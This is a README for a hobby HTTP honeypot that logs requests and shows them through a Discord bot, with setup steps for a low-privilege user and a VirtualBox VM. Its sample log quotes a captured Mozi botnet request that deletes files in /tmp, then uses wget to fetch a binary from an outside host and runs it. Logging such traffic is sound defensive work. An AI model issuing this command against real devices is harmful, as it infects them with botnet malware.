# Home Alone 
A simple and open source honeypot system for detecting and tracking live threats on the internet. 

	- Logging the requests being made, the addresses and the time.
	- Discord bot to interact with the honeypot and see whats happening in real time.
More features to come.

## Logging 
Requests to the server are logged by date/time (files created each time you start honeypot).
Here's an example of some of the malicious traffic I've seen: 

```
====================================================================
Connection at 4/19/2021 - 0:41:23 :
{"5.178.86.76" : "b'POST http://check.best-proxies.ru/azenv.php?s=VJVJVDNRIJOOVEVCPRNRPJUONNURYR HTTP/1.1\r\nHost: check.best-proxies.ru\r\nCookie: testCookie=true\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0\r\nReferer: https://best-proxies.ru/\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\nConnection: close\r\n\r\ntestPost=true\r\n\r\n'"
================================================================================
Connection at 4/19/2021 - 16:10:54 :
{"<redacted>" : "b'GET /shell?cd+/tmp;rm+-rf+*;wget+http://<redacte>:35094/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1\r\nUser-Agent: Hello, world\r\nHost: <removed>\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection: keep-alive\r\n\r\n'"
================================================================================
```

## Discord Bot 
Using the discord bot you can retrieve and view these logs in real time as well as do GeoIP lookups:
```
"{\n  \"ip\": \"211.40.129.246\",\n  \"city\": \"Seonghwan\",\n  \"region\": \"Chungcheongnam-do\",\n  \"country\": \"KR\",\n  \"loc\": \"36.9156,127.1314\",\n  \"org\": \"AS3786 LG DACOM Corporation\",\n  \"postal\": \"31014\",\n  \"timezone\": \"Asia/Seoul\",\n  \"readme\": \"https://ipinfo.io/missingauth\"\n}"

"{\n  \"ip\": \"46.43.113.22\",\n  \"hostname\": \"adsl-46.43.113.22.mada.ps\",\n  \"city\": \"Ramallah\",\n  \"region\": \"West Bank\",\n  \"country\": \"PS\",\n  \"loc\": \"31.8996,35.2042\",\n  \"org\": \"AS51407 Mada ALArab LTD\",\n  \"timezone\": \"Asia/Hebron\",\n  \"readme\": \"https://ipinfo.io/missingauth\"\n}"
```

**working on a feature for automated reporting to AbuseIPDB.com**

## Setup 
Because this needs  to be run on the public internet, you can try changing to port 8080, adding a lower privilege user an running from that account. By default this is setup to run to grab headers and requests of HTTP traffic on port 80 by default. 

Create a `.env` file in the `/HomeAlone/code/` Directory. This is where you should put:
```
HONEY=IP_ADDRESS_OF_HONEY_POT
HOSTN=HOST_NAME_OF_HONEY_POT_USER
TOKEN=DISCORD_BOT_API_TOKEN
ABUSE=FREE_ABUSE_IPDB_API_TOKEN 
``` 
Last one is optional (and not fully functional yet). 


## Adding Virtualization 
I'm working on ways to have this code run inside a VM instead, and perhaps use something like Cuckoo to automate the analysis of requests, and links the honeypot catches.

### Setting up Virtual Machine on Remote Server 
A more secure way to run this software would be to have the honeypot contained in a VM, run from a user with low privileges. Let's step through how we can set this up.

#### Adding a new User
Setting up a non-root user, in this case a user named `homealone` for running our sandboxed honeypot application. Run the following on the remote server (as root) to ensure this lower priveleged user will be able to user packet capture without being denied permissions. 
```
$ sudo groupadd homealone
$ sudo usermod -a -G pcap homealone
$ sudo chgrp pcap /usr/sbin/tcpdump
$ sudo setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
```
If this worked, you should be able to login as the `homealone` user and run the following as a check that you can run `tcpdump` as non-root user:
```
$ getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

Then install VirtualBox on the server you intend to use for hosting the Honeypot. 

Once Installed, we need to setup our virtual machine. I'm going to setup Ubuntu 20.04. First we can use `VboxManager` to create the VM.
```bash
 VBoxManage createvm --name "Ubuntu 20.04" --ostype Ubuntu_64 --register
```





### Creating a discord bot 
Once you have the code running on your honeypot, you can go [here](https://discord.com/developers/applications) and add the DiscordBot add-on. 

The bot needs permissions for reading/writing into channels, adding reactions/emojis/embeds. 


### Contributing 
I would be happy to have more experienced people help me improve this project. If you want to 
make contributions feel free to make a pull request, and we can chat about how to make this more effective. 